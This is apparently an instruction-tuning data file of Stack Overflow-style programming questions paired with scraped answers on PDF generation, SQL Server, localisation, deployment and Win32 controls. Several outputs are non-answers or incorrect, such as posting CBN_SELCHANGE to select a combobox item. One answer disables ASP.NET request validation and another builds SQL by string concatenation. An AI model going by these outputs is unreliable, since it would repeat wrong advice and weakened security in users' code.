{"instruction": "I want to be able to generate PDF ouput from my (native) C++ Windows application. Are there any free/open source libraries available to do this?\nI looked at the answers to this question, but they mostly relate to .Net.", "output": "LibHaru\n\nHaru is a free, cross platform,\n  open-sourced software library for\n  generating PDF written in ANSI-C. It\n  can work as both a static-library (.a,\n  .lib) and a shared-library (.so,\n  .dll).\n\nDidn't try it myself, but maybe it can help you"}
{"instruction": "I want to be able to generate PDF ouput from my (native) C++ Windows application. Are there any free/open source libraries available to do this?\nI looked at the answers to this question, but they mostly relate to .Net.", "output": "If you're brave and willing to roll your own, you could start with a PostScript library and augment it to deal with PDF, taking advantage of Adobe's free online PDF reference."}
{"instruction": "Is it possible to obtain raw logs from Google Analytic? Is there any tool that can generate the raw logs from GA?", "output": "No. But why don't you just use your webserver's logs? The value of GA is not in the data they collect, but the aggregation/analysis. That's why it's not called Google Raw Data."}
{"instruction": "I'd like to add dvd burning functionality to my .Net app (running on Windows Server 2003), are there any good components available?  I've used the NeroCOM sdk that used to come with Nero but they no longer support the sdk in the latest versions of Nero.  I learned that Microsoft has created an IMAPI2 upgrade for Windows XP/2003 and there is an example project at CodeProject but not having used it myself I can't say how easy/reliable it is to use.\nI'm not really worried about burning audio/video to DVD as this is for file backup purposes only.", "output": "I've used the code from the codeproject article and it works pretty well. It's a nice wrapper around the IMAPI2, so as longs as IMAPI2 supports what you need to do, the .NET wrapper will do it."}
{"instruction": "I want to be able to generate PDF ouput from my (native) C++ Windows application. Are there any free/open source libraries available to do this?\nI looked at the answers to this question, but they mostly relate to .Net.", "output": "LibHaru seems to be used by many.\n\nA non-open source approach is: PDF Creator Pilot which provides more language options  including C++, C#, Delphi, ASP, ASP.NET, VB, VB.NET, VBScript, PHP and Python"}
{"instruction": "I want to be able to generate PDF ouput from my (native) C++ Windows application. Are there any free/open source libraries available to do this?\nI looked at the answers to this question, but they mostly relate to .Net.", "output": "It depends a bit on your needs. Some toolkits are better at drawing, others are better for writing text. Cairo has a pretty good for drawing (it support a wide range of screen and file types, including pdf), but it may not be ideal for good typography."}
{"instruction": "I'm quite confident that globally declared variables get allocated (and initialized, if applicable) at program start time.\nint globalgarbage;\nunsigned int anumber = 42;\n\nBut what about static ones defined within a function?\nvoid doSomething()\n{\n  static bool globalish = true;\n  // ...\n}\n\nWhen is the space for globalish allocated? I'm guessing when the program starts. But does it get initialized then too? Or is it initialized when doSomething() is first called?", "output": "Some relevant verbiage from C++ Standard:\n\n3.6.2  Initialization of non-local objects          [basic.start.init]\n1\nThe   storage   for   objects    with    static    storage \n  duration   (basic.stc.static) shall be zero-initialized (dcl.init)\n  before any   other   initialization  takes  place. Objects  of \n  POD    types   (basic.types) with static storage duration\n  initialized with constant   expressions (expr.const) shall be \n  initialized  before  any  dynamic   initialization  takes  place. \n  Objects of namespace scope with static   storage duration defined in\n  the same translation unit and  dynamically   initialized  shall  be\n  initialized in the order in which their definition  appears  in \n  the  translation  unit. [Note:  dcl.init.aggr  describes  the \n  order in which aggregate members are initialized. The \n  initialization of local static objects is described in stmt.dcl.  ]\n[more text below adding more liberties for compiler writers]\n6.7  Declaration statement                                  [stmt.dcl]\n...\n4\nThe zero-initialization (dcl.init) of all local objects with \n  static storage  duration  (basic.stc.static) is performed before\n  any other initialization  takes   place. A   local  object of \n  POD type (basic.types)  with static  storage  duration\n  initialized with constant-expressions is initialized before its\n  block is first entered. An implementation  is  permitted to perform\n  early initialization of other local objects with static storage\n  duration under the same conditions that an implementation is\n  permitted to statically initialize an object with static storage\n  duration in namespace scope  (basic.start.init). Otherwise  such\n  an object is initialized the first time control passes through its\n  declaration; such an object is considered initialized upon the\n  completion of its initialization. If the initialization exits by \n  throwing an exception, the initialization is not complete, so it will\n  be  tried again the next time control enters the declaration.  If control re-enters the declaration (recursively) while the object is being\n  initialized, the behavior is undefined.  [Example:\n      int foo(int i)\n      {\n          static int s = foo(2*i);  // recursive call - undefined\n          return i+1;\n      }\n\n--end example]\n5\nThe destructor for a local object with static storage duration will\n  be   executed  if  and  only  if  the  variable  was  constructed. \n  [Note:   basic.start.term  describes  the  order  in which local\n  objects with   static storage duration are destroyed.  ]"}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "As I can't accept two answers, I'm going to merge Christ Upchurch's and 17 of 26's answers in my own post. I think, these two together pretty much sum up what I wanted to know. Thanks guys!"}
{"instruction": "I've been trying to convert SVG images to PNG using C#, without having to write too much code. Can anyone recommend a library or example code for doing this?", "output": "You can call the command-line version of inkscape to do this:\nhttp://harriyott.com/2008/05/converting-svg-images-to-png-in-c.aspx\nAlso there is a C# SVG rendering engine, primarily designed to allow SVG files to be used on the web on codeplex that might suit your needs if that is your problem:\nOriginal Project\nhttp://www.codeplex.com/svg\nFork with fixes and more activity: (added 7/2013)\nhttps://github.com/vvvv/SVG"}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "I'd say yes. To me, it just breaks the 'flow' of a fluidly-written piece of code.\nAnother argument could also be that if you stick to the basic keywords supported by most modern languages, then your program flow (if not the logic or code) could be ported to any other language. Having an unsupported keyword (ie, continue or goto) would break that.\nIt's really more of a personal preference, but I've never had to use it and don't really consider it an option when I'm writing new code. (same as goto.)"}
{"instruction": "I have a wrapper around a C++ function call which I call from C# code. How do I attach a debugger in Visual Studio to step into the native C++ code?\nThis is the wrapper that I have which calls GetData() defined in a C++ file:\n    [DllImport(\"Unmanaged.dll\", CallingConvention=CallingConvention.Cdecl, \n               EntryPoint = \"GetData\", BestFitMapping = false)]\n        public static extern String GetData(String url);\n\nThe code is crashing and I want to investigate the root cause.\nThanks,\nNikhil", "output": "To anyone using WinDbg:\n1>Setup symbols\nLook at these commands. (Help: in console .hh < command> )\n.sympath\n.sympath+ \n.symfix\n\n2>Set up source path\n.srcpath\n\n3>Load SOS extention to debug managed / mixed mode programs.\n(Make sure you have extention path setup correctly)\nAdd Microsoft.NET\\Framework\\v2.0.50727 for x86 using-\n.extpath\n\nSet a breakpoint for the clr to load.\nsxe ld:mscorwks\n\n(F5 / g)\n(Wait for  ModLoad BP on mscorwks.dll)\nMake sure you dont have a duplicate sos extention already loaded. See:\n.chain\n\nNow we're ready to load the sos extention. :)\n.loadby sos mscorwks\n\n4> Reload all the symbols..\n.reload\n\nNow you're all set :)\n(YMMV)"}
{"instruction": "I'm using SQL Server 2005, and I would like to know how to access different result sets from within transact-sql. The following stored procedure returns two result sets, how do I access them from, for example, another stored procedure?\nCREATE PROCEDURE getOrder (@orderId as numeric) AS\nBEGIN   \n    select order_address, order_number from order_table where order_id = @orderId\n    select item, number_of_items, cost from order_line where order_id = @orderId\nEND\n\nI need to be able to iterate through both result sets individually.\nEDIT: Just to clarify the question, I want to test the stored procedures. I have a set of stored procedures which are used from a VB.NET client, which return multiple result sets. These are not going to be changed to a table valued function, I can't in fact change the procedures at all. Changing the procedure is not an option.\nThe result sets returned by the procedures are not the same data types or number of columns.", "output": "You could select them into temp tables or write table valued functions to return result sets. Are asking how to iterate through the result sets?"}
{"instruction": "I have heard that the Liskov Substitution  Principle (LSP) is a fundamental principle of object oriented design. What is it and what are some examples of its use?", "output": "Robert Martin has an excellent paper on the Liskov Substitution Principle here. It discusses subtle and not-so-subtle ways in which the principle may be violated."}
{"instruction": "I'm using SQL Server 2005, and I would like to know how to access different result sets from within transact-sql. The following stored procedure returns two result sets, how do I access them from, for example, another stored procedure?\nCREATE PROCEDURE getOrder (@orderId as numeric) AS\nBEGIN   \n    select order_address, order_number from order_table where order_id = @orderId\n    select item, number_of_items, cost from order_line where order_id = @orderId\nEND\n\nI need to be able to iterate through both result sets individually.\nEDIT: Just to clarify the question, I want to test the stored procedures. I have a set of stored procedures which are used from a VB.NET client, which return multiple result sets. These are not going to be changed to a table valued function, I can't in fact change the procedures at all. Changing the procedure is not an option.\nThe result sets returned by the procedures are not the same data types or number of columns.", "output": "There are two ways to do this easily. Either stick the results in a temp table and then reference the temp table from your sproc. The other alternative is to put the results into an XML variable that is used as an OUTPUT variable.\nThere are, however, pros and cons to both of these options. With a temporary table, you'll need to add code to the script that creates the calling procedure to create the temporary table before modifying the procedure. Also, you should clean up the temp table at the end of the procedure.\nWith the XML, it can be memory intensive and slow."}
{"instruction": "After attending a recent Alt.NET group on IoC, I got to thinking about the tools available and how they might work.  StructureMap in particular uses both attributes and bootstrapper concepts to map requests for IThing to ConcreteThing.  Attributes automatically throw up flags for me that either reflection or IL injection is going on.  Does anyone know exactly how this works (for StructureMap or other IoC tools) and what the associated overhead might be either at run-time or compile-time?", "output": "I use Windsor from the CastleProject and have found it immensely useful in reducing dependencies. I haven't noticed a performance issue yet but one thing I do find is that the configuration can get a bit cumbersome. To help in this regard I'm starting to look at Binsor, which is a DSL for Windsor written in boo.\nAnother thing to be aware of is that when navigating code you wont be able to go to the code that will be executing at runtime."}
{"instruction": "I have heard that the Liskov Substitution  Principle (LSP) is a fundamental principle of object oriented design. What is it and what are some examples of its use?", "output": "LSP concerns invariants. Your board example is broken at the outset because the interfaces simply don't match.\nA better example would be the following (implementations omitted):\nclass Rectangle {\n    int getHeight() const;\n    void setHeight(int value);\n    int getWidth() const;\n    void setWidth(int value);\n};\n\nclass Square : public Rectangle { };\n\nNow we have a problem although the interface matches. The reason is that we have violated invariants stemming from the mathematical definition of squares and rectangles. The way getters and setters work, a Rectangle should satisfy the following invariant:\nvoid invariant(Rectangle& r) {\n    r.setHeight(200);\n    r.setWidth(100);\n    assert(r.getHeight() == 200 and r.getWidth() == 100);\n}\n\nHowever, this invariant must be violated by a correct implementation of Square, therefore it is not a valid substitute of Rectangle."}
{"instruction": "I have a site, which contains several ashx handlers, on a couple of the handlers I want to reject non-SSL requests. Is there a way that I can do this in code?", "output": "If you must do it programmatically, a way I've done it in the past is to inspect the url and look for \"https\" in it. Redirect if you don't see that. Request.IsSecureConnection should be the preferred method, however. You may have to add additional logic to handle a loopback address."}
{"instruction": "I'm using SQL Server 2005, and I would like to know how to access different result sets from within transact-sql. The following stored procedure returns two result sets, how do I access them from, for example, another stored procedure?\nCREATE PROCEDURE getOrder (@orderId as numeric) AS\nBEGIN   \n    select order_address, order_number from order_table where order_id = @orderId\n    select item, number_of_items, cost from order_line where order_id = @orderId\nEND\n\nI need to be able to iterate through both result sets individually.\nEDIT: Just to clarify the question, I want to test the stored procedures. I have a set of stored procedures which are used from a VB.NET client, which return multiple result sets. These are not going to be changed to a table valued function, I can't in fact change the procedures at all. Changing the procedure is not an option.\nThe result sets returned by the procedures are not the same data types or number of columns.", "output": "The short answer is: you can't do it.\nFrom T-SQL there is no way to access multiple results of a nested stored procedure call, without changing the stored procedure as others have suggested.\nTo be complete, if the procedure were returning a single result, you could insert it into a temp table or table variable with the following syntax:\nINSERT INTO #Table (...columns...)\nEXEC MySproc ...parameters...\n\nYou can use the same syntax for a procedure that returns multiple results, but it will only process the first result, the rest will be discarded."}
{"instruction": "I have a site, which contains several ashx handlers, on a couple of the handlers I want to reject non-SSL requests. Is there a way that I can do this in code?", "output": "I think the proper way is to check the Request.IsSecureConnection property and redirect or throw if it's false"}
{"instruction": "I have a site, which contains several ashx handlers, on a couple of the handlers I want to reject non-SSL requests. Is there a way that I can do this in code?", "output": "Try using the System.Web.HttpContext.Current.Request.IsSecureConnection to validate whether they are connecting securely, and then perform whatever denies you would like after that (returning an error message, or whatever your business need is)."}
{"instruction": "I am stress testing a .NET web application.  I did this for 2 reasons: I wanted to see what performance was like under real world conditions and also to make sure we hadn't missed any problems during testing. We had 30 concurrent users in the application using it as they would during the normal course of their jobs. Most users had multiple windows of the application open.\n\n10 Users: Not bad\n20 Users: Slowing down \n30 Users: Very, very slow but no timeouts\n\nIt was loaded on the production server. It is a virtual server with a 2.66G Hz Xeon processor and 2 GB of RAM. We are using Win2K3 SP2. We have .NET 1.1 and 2.0 loaded and are using SQLExpress SP1.\nWe rechecked the indexes on all of the tables afterword and they were all as they should be.\nHow can we improve our application's performance?", "output": "You may be running into concurrency issues, depending on how your application runs. Try performing your reads with the \"nolock\" keyword. \nTry adding in table aliases for your columns (and avoid the use of SELECT *), this helps out MSSQL, as it doesn't have to \"guess\" which table the columns come from. \nIf you aren't already, move to SPROCs, this allows MSSQL to index your data better for a given query's normal result set.\nTry following the execution plan of your SPROCS to ensure they are using the indexes you think they are.\nRun a trace against your database to see what the incoming requests look like. You may notice a particular SPROC is being run over and over: generally a good sign to cache the responses on the client if possible. (lookup lists, etc.)"}
{"instruction": "I am stress testing a .NET web application.  I did this for 2 reasons: I wanted to see what performance was like under real world conditions and also to make sure we hadn't missed any problems during testing. We had 30 concurrent users in the application using it as they would during the normal course of their jobs. Most users had multiple windows of the application open.\n\n10 Users: Not bad\n20 Users: Slowing down \n30 Users: Very, very slow but no timeouts\n\nIt was loaded on the production server. It is a virtual server with a 2.66G Hz Xeon processor and 2 GB of RAM. We are using Win2K3 SP2. We have .NET 1.1 and 2.0 loaded and are using SQLExpress SP1.\nWe rechecked the indexes on all of the tables afterword and they were all as they should be.\nHow can we improve our application's performance?", "output": "Update: Looks like SQL Server express is not the problem as they were using the same product in previous version of the application. I think your next step is in identifying the bottlenecks. If you are sure it is in the database layer, I would recommend taking a profiler trace and bringing down the execution time of the most expensive queries.\nThis is another link I use for collecting statistics from SQL Server Dynamic Management Views (DMVs) and related Dynamic Management Functions (DMFs). Not sure if we can use in the Express edition.\nUncover Hidden Data to Optimize Application Performance.\n\nAre you using SQL Server Express for a web app? As far as I know, it has some limitations for production deployment.\nSQL Server Express is free and can be redistributed by ISV's (subject to agreement). SQL Server Express is ideal for learning and building desktop and small server applications. This edition is the best choice for independent software vendors, non-professional developers, and hobbyists building client applications. If you need more advanced database features, SQL Server Express can be seamlessly upgraded to more sophisticated versions of SQL Server."}
{"instruction": "I am stress testing a .NET web application.  I did this for 2 reasons: I wanted to see what performance was like under real world conditions and also to make sure we hadn't missed any problems during testing. We had 30 concurrent users in the application using it as they would during the normal course of their jobs. Most users had multiple windows of the application open.\n\n10 Users: Not bad\n20 Users: Slowing down \n30 Users: Very, very slow but no timeouts\n\nIt was loaded on the production server. It is a virtual server with a 2.66G Hz Xeon processor and 2 GB of RAM. We are using Win2K3 SP2. We have .NET 1.1 and 2.0 loaded and are using SQLExpress SP1.\nWe rechecked the indexes on all of the tables afterword and they were all as they should be.\nHow can we improve our application's performance?", "output": "This is just something that I thought of, but check to see how much memory SQL Server is using when you have 20+ users - one of the limitations of the Express version is that it is limited to 1GB of RAM. So it might just be a simple matter of there not being enough memory available to to server due to the limitations of Express."}
{"instruction": "When trying to enter a SQL query with parameters using the Oracle OLE DB provider I get the following error:\n\nParameters cannot be extracted from the SQL command. The provider might not help to parse parameter information from the command. In that case, use the \"SQL command from variable\" access mode, in which the entire SQL command is stored in a variable.\n  ADDITIONAL INFORMATION:\n  Provider cannot derive parameter information and SetParameterInfo has not been called. (Microsoft OLE DB Provider for Oracle) \n\nI have tried following the suggestion here but don't quite understand what is required:Parameterized queries against Oracle\nAny ideas?", "output": "To expand on the link given in the question:\n\nCreate a package variable\nDouble click on the package variable name. (This allows you to access the properties of the variable)\nSet the property 'EvaluateAsExpression' to true\nEnter the query in the expression builder.\nSet the OLE DB source query to SQL Command from Variable\n\nThe expression builder can dynamically create expressions using variable to create 'parametised queries'.\nSo the following 'normal' query:\nselect * from book where book.BOOK_ID = ?\n\nCan be written in the expression builder as:\n\"select * from book where book.BOOK_ID = \" + @[User::BookID]\n\nYou can then do null handling and data conversion using the expression builder."}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "Learn about the System.Globalization namespace:\nSystem.Globalization\nAlso, a good book is NET Internationalization: The Developer's Guide to Building Global Windows and Web Applications"}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "Would be good to refresh a bit on Unicodes if you are targeting other cultures,languages.\nThe Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets (No Excuses!)"}
{"instruction": "I am getting this error now that I hit version number 1.256.0:\nError   4\tInvalid product version '1.256.0'. Must be of format '##.##.####'\nThe installer was fine with 1.255.0 but something with 256 (2^8) it doesn't like.  I found this stated on msdn.com:\nThe Version property must be formatted as N.N.N, where each N represents at least one and no more than four digits. (http://msdn.microsoft.com/en-us/library/d3ywkte8(VS.80).aspx)\nWhich would make me believe there is nothing wrong 1.256.0 because it meets the rules stated above.\nDoes anyone have any ideas on why this would be failing now?", "output": "The link you reference says \" This page is specific to Microsoft Visual Studio 2008/.NET Framework 3.5\", but you're talking about vs2005.\nMy guess: a 0-based range of 256 numbers ends at 255, therefore trying to use 256 exceeds that and perhaps they changed it for VS2008\nEdit: I looked again and see where that link can be switched to talk about VS2005, and gives the same answer.  I'm still sticking to my 0-255 theory though.  Wouldn't be the first time this week I came across something incorrect in MSDN docs."}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "I would suggest:\n\nPut all strings in either the database or resource files.   \nAllow extra space for translated text, as some (e.g. German) are wordier."}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "A couple of things that I've learned:\n\nAbsolutely and brutally minimize the number of images you have that contain text. Doing so will make your life a billion percent easier since you won't have to get a new set of images for every friggin' language.\nBe very wary of css positioning that relies on things always remaining the same size. If  those things contain text, they will not remain the same size, and you will then need to go back and fix your designs.\nIf you use character types in your sql tables, make sure that any of those that might receive international input are unicode (nchar, nvarchar, ntext). For that matter, I would just standardize on using the unicode versions.\nIf you're building SQL queries dynamically, make sure that you include the N prefix before any quoted text if there's any chance that text might be unicode. If you end up putting garbage in a SQL table, check to see if that's there.\nMake sure that all your web pages definitively state that they are in a unicode format. See Joel's article, mentioned above.\nYou're going to be using resource files a lot for this project. That's good - ASP.NET 2.0 has great support for such. You'll want to look into the App_LocalResources and App_GlobalResources folder as well as GetLocalResourceObject, GetGlobalResourceObject, and the concept of meta:resourceKey. Chapter 30 of Professional ASP.NET 2.0 has some great content regarding that. The 3.5 version of the book may well have good content there as well, but I don't own it.\nThink about fonts. Many of the standard fonts you might want to use aren't unicode capable. I've always had luck with Arial Unicode MS, MS Gothic, MS Mincho. I'm not sure about how cross-platform these are, though. Also, note that not all fonts support all of the Unicode character definition. Again, test, test, test.\nStart thinking now about how you're going to get translations into this system. Go talk to whoever is your translation vendor about how they want data passed back and forth for translation. Think about the fact that, through your local resource files, you will likely be repeating some commonly used strings through the system. Do you normalize those into global resource files, or do you have some sort of database layer where only one copy of each text used is generated. In our recent project, we used resource files which were generated from a database table that contained all the translations and the original, english version of the resource files. \nTest. Generally speaking I will test in German, Polish, and an Asian language (Japanese, Chinese, Korean). German and Polish are wordy and nearly guaranteed to stretch text areas, Asian languages use an entirely different set of characters which tests your unicode support."}
{"instruction": "I'm trying to run some queries to get rid of XSS in our database using Web Data Administrator but I keep running into this Potentially Dangerous Request crap.\nHow do I disable validation of the query in Web Data Administrator?", "output": "Go into the install directory of web data admin, usually:\nC:\\Program Files\\Microsoft SQL Server Tools\\Microsoft SQL Web Data Administrator\nThen in the \"Web\" folder open the file \"QueryDatabase.aspx\" and edit the following line:\n<%@ Page language=\"c#\" Codebehind=\"QueryDatabase.aspx.cs\" AutoEventWireup=\"false\" Inherits=\"SqlWebAdmin.query\" %>\nAdd ValidateRequest=\"false\" to the end of it like so:\n<%@ Page language=\"c#\" Codebehind=\"QueryDatabase.aspx.cs\" AutoEventWireup=\"false\" Inherits=\"SqlWebAdmin.query\" ValidateRequest=\"false\" %>\nNOTE: THIS IS POTENTIALLY DANGEROUS!! Be Careful!"}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "This is a hard problem.  I live in Canada, so multilingualism is a big issue.  In all my years of doing software development, I've never seen a solution that I liked.  I've seen a lot of solutions that worked, and got the job done, but they've always felt like a big kludge.  I would go with @harriyott, and make sure that none of your strings are actually in code.  A resource file works well for desktop applications. However in ASP.Net, I'd recommend using the database. @John Christensen also has some good pointers."}
{"instruction": "I am getting this error now that I hit version number 1.256.0:\nError   4\tInvalid product version '1.256.0'. Must be of format '##.##.####'\nThe installer was fine with 1.255.0 but something with 256 (2^8) it doesn't like.  I found this stated on msdn.com:\nThe Version property must be formatted as N.N.N, where each N represents at least one and no more than four digits. (http://msdn.microsoft.com/en-us/library/d3ywkte8(VS.80).aspx)\nWhich would make me believe there is nothing wrong 1.256.0 because it meets the rules stated above.\nDoes anyone have any ideas on why this would be failing now?", "output": "This article says there is a major and minor max of 255.\nhttp://msdn.microsoft.com/en-us/library/aa370859(VS.85).aspx"}
{"instruction": "I'm writing an asp.net application that will need to be localized to several regions other than North America.  What do I need to do to prepare for this globalization?  What are your top 1 to 2 resources for learning how to write a world ready application.", "output": "Make sure you're compiling with Code Analysis turned on, and pay attention to the Globalization warnings that it gives you.  Keep data in an invariant format (CultureInfo.InvariantCulture) until you display it to the user (then use CultureInfo.CurrentCulture)."}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": "You can also sort a dictionary by value and control the sort order:\nimport operator\n\nd = {'b' : 'this is 3', 'a': 'this is 2' , 'c' : 'this is 1'}\n\nfor key, value in sorted(d.iteritems(), key=operator.itemgetter(1), reverse=True):\n    print key, \" \", value\n\nOutput:\nb   this is 3\na   this is 2\nc   this is 1"}
{"instruction": "I'm writing a utility for myself, partly as an exercise in learning C# Reflection and partly because I actually want the resulting tool for my own use.\nWhat I'm after is basically pointing the application at an assembly and choosing a given class from which to select properties that should be included in an exported HTML form as fields. That form will be then used in my ASP.NET MVC app as the beginning of a View.\nAs I'm using Subsonic objects for the applications where I want to use, this should be reasonable and I figured that, by wanting to include things like differing output HTML depending on data type, Reflection was the way to get this done.\nWhat I'm looking for, however, seems to be elusive. I'm trying to take the DLL/EXE that's chosen through the OpenFileDialog as the starting point and load it:\nString FilePath = Path.GetDirectoryName(FileName);\nSystem.Reflection.Assembly o = System.Reflection.Assembly.LoadFile(FileName);\n\nThat works fine, but because Subsonic-generated objects actually are full of object types that are defined in Subsonic.dll, etc., those dependent objects aren't loaded. Enter:\nAssemblyName[] ReferencedAssemblies = o.GetReferencedAssemblies();\n\nThat, too, contains exactly what I would expect it to. However, what I'm trying to figure out is how to load those assemblies so that my digging into my objects will work properly. I understand that if those assemblies were in the GAC or in the directory of the running executable, I could just load them by their name, but that isn't likely to be the case for this use case and it's my primary use case.\nSo, what it boils down to is how do I load a given assembly and all of its arbitrary assemblies starting with a filename and resulting in a completely Reflection-browsable tree of types, properties, methods, etc.\nI know that tools like Reflector do this, I just can't find the syntax for getting at it.", "output": "Couple of options here:\n\nAttach to AppDomain.AssemblyResolve and do another LoadFile based on the requested assembly.\nSpin up another AppDomain with the directory as its base and load the assemblies in that AppDomain.\n\nI'd highly recommend pursuing option 2, since that will likely be cleaner and allow you to unload all those assemblies after. Also, consider loading assemblies in the reflection-only context if you only need to reflect over them (see Assembly.ReflectionOnlyLoad)."}
{"instruction": "Can you suggest some good MVC framework for perl -- one I am aware of is catalyst\nThe need is to be able to expose services on the perl infrastructure which can be called by Java/.Net applications seamlessly.", "output": "For your problem I would take a look into Jifty::Plugin::REST which allows access to models and actions using various formats.\nLet me just say that Jifty doesn't have terrible documentation. However, most of included documentation is API documentation, but there is very low-noise mailing list which has useful tips and links to applications.\nWiki at http://jifty.org/ is another resource which has useful bits.\nIf your goal is to make video store (my favorite benchmark for 4GLs and CRUD frameworks) in afternoon, it's really worth a look!"}
{"instruction": "I'm trying to create a standard way of rolling out web applications for our company.  Currently we do it with zip files, vbscript/javascript, and manual some steps.  \nFor thick client installs we generate MSI installers using Wise/Wix.  We don't create installers currently for websites as in general they are just xcopy deploy.  However we have some config files that need to be changed, verify that certain handlers are registered in IIS...  The list goes on.\nDo most people use MSI installers for web applications as well, or some other tool/scripting language?", "output": "You may want to look at:\n\nHow do I get a deployable output from a build script with ASP.NET\nStep by Step ASP.NET Automated Build/Deploy\n\nWe use MSI to create basic installers for our web projects too, often using the Web Setup Projects in VS and sometimes completely custom installers. You may also want to look at MSDeploy."}
{"instruction": "I'm trying to create a standard way of rolling out web applications for our company.  Currently we do it with zip files, vbscript/javascript, and manual some steps.  \nFor thick client installs we generate MSI installers using Wise/Wix.  We don't create installers currently for websites as in general they are just xcopy deploy.  However we have some config files that need to be changed, verify that certain handlers are registered in IIS...  The list goes on.\nDo most people use MSI installers for web applications as well, or some other tool/scripting language?", "output": "We're moving to an MSI for our installs, so far with mixed results. I'm a control freak so I would personally prefer a series of scripts that I had more direct control over. I've used ANT in the past with good results."}
{"instruction": "I'm trying to create a standard way of rolling out web applications for our company.  Currently we do it with zip files, vbscript/javascript, and manual some steps.  \nFor thick client installs we generate MSI installers using Wise/Wix.  We don't create installers currently for websites as in general they are just xcopy deploy.  However we have some config files that need to be changed, verify that certain handlers are registered in IIS...  The list goes on.\nDo most people use MSI installers for web applications as well, or some other tool/scripting language?", "output": "I recently spent a few days working on automating deployments at my company. \nWe use a combination of CruiseControl, NAnt, MSBuild to generate a release version of the app. Then a separate script uses MSDeploy and XCopy to backup the live site and transfer the new files over. \nOur solution is briefly described in an answer to this question http://stackoverflow.com/questions/45783/automate-deployment-for-web-applications"}
{"instruction": "I'm trying to create a standard way of rolling out web applications for our company.  Currently we do it with zip files, vbscript/javascript, and manual some steps.  \nFor thick client installs we generate MSI installers using Wise/Wix.  We don't create installers currently for websites as in general they are just xcopy deploy.  However we have some config files that need to be changed, verify that certain handlers are registered in IIS...  The list goes on.\nDo most people use MSI installers for web applications as well, or some other tool/scripting language?", "output": "Have you checked out NAnt and CruiseControl?\nCombined, they can provide an easy and automated way to build and deploy your web apps."}
{"instruction": "I need to update a combobox with a new value so it changes the reflected text in it. The cleanest way to do this is after the comboboxhas been initialised and with a message.\nSo I am trying to craft a postmessage to the hwnd that contains the combobox.\nSo if I want to send a message to it, changing the currently selected item to the nth item, what would the postmessage look like?\nI am guessing that it would involve ON_CBN_SELCHANGE, but I can't get it to work right.", "output": "You want ComboBox_SetCurSel:\nComboBox_SetCurSel(hWndCombo, n);\n\nor if it's an MFC CComboBox control you can probably do:\nm_combo.SetCurSel(2);\n\nI would imagine if you're doing it manually you would also want SendMessage rather than PostMessage. CBN_SELCHANGE is the notification that the control sends back to you when the selection is changed.\nFinally, you might want to add the c++ tag to this question."}
{"instruction": "PostgreSQL is interesting in that it supports several languages for writing stored procedures.  Which one do you use, and why?", "output": "Skype uses PostgreSQL together with python, and they have improved PL/Python to it's current state so I would doubt that python support is far behind perl. They have written queuing/replication system on top of those bindings, after all :-) \nTake a look: Wiki Skytools\n\nFrom a quick look in documentation, python seems to have less\n  documentation than perl bindings, but I would suggest to just stick\n  with language you are most comfortable with."}
{"instruction": "I need to update a combobox with a new value so it changes the reflected text in it. The cleanest way to do this is after the comboboxhas been initialised and with a message.\nSo I am trying to craft a postmessage to the hwnd that contains the combobox.\nSo if I want to send a message to it, changing the currently selected item to the nth item, what would the postmessage look like?\nI am guessing that it would involve ON_CBN_SELCHANGE, but I can't get it to work right.", "output": "A concise version:\nconst int index = 0;\nm_comboBox.PostMessage(CBN_SELCHANGE, index);"}
{"instruction": "I have a wildcard subdomain enabled and dynamically parse the URL by passing it as-is to my index.php (ex. somecity.domain.com).  \nNow, I wish to create a few subdomains that are static where I can install different application and not co-mingle with my current one (ex. blog.domain.com).\nMy .htaccess currently reads:\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nCan I manipulate this .htaccess to achieve what I need? Can it be done through Apache?", "output": "You'll have to configure apache for those static sub-domains. The \"catch-all\" site will be the default site configured, so that one will catch the other ones."}
{"instruction": "How do I create a button control (with CreateWindow of a BUTTON window class) that has a standard system-wide size (especially height) that's consistent with the rest of Windows applications?\nI should of course take DPI into account and probably other settings.\n\nRemark: Using USE_CW_DEFAULT for width and height results in a 0, 0 size button, so that's not a solution.", "output": "@macbirdie: you should NOT use GetDialogBaseUnits(), it is based on the default system font (Ugly bitmap font). You should use MapDialogRect()"}
